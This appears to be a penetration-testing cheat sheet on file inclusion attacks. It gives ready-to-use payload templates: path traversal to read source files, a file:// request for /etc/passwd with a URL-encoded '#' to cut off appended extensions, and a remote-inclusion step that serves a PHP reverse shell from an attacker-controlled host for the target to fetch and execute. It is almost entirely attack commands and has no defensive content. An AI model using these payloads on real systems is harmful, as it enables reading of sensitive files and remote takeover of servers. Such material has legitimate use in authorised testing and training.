# File Inclusion (LFI/RFI)

LFI via a "theme/template/skin"-style parameter — traverse to read source instead of rendering it:

```bash
view-source:http://<TARGET>/<page>?<param>=../<target-file-no-ext>
```

`file://` scheme on any "fetch by URL" param — try it even when the param looks URL-only. If the backend appends a suffix/extension, truncate it with a URL-encoded `#`:

```bash
<param>=file:///etc/passwd
<param>=file:///etc/passwd%23          # %23 = '#', drops anything the server appends after it
```

RFI — if the include/fetch isn't restricted to local paths, point it at attacker-hosted code. Some includes evaluate fetched PHP even without `<?php ?>` tags if the sink does `eval`/`include` on raw fetched content:

```bash
python -m http.server <LPORT>     # serve your payload (e.g. pentestmonkey php-reverse-shell)
GET /<endpoint>?<param>=http://<LHOST>:<LPORT>/shell.php
```
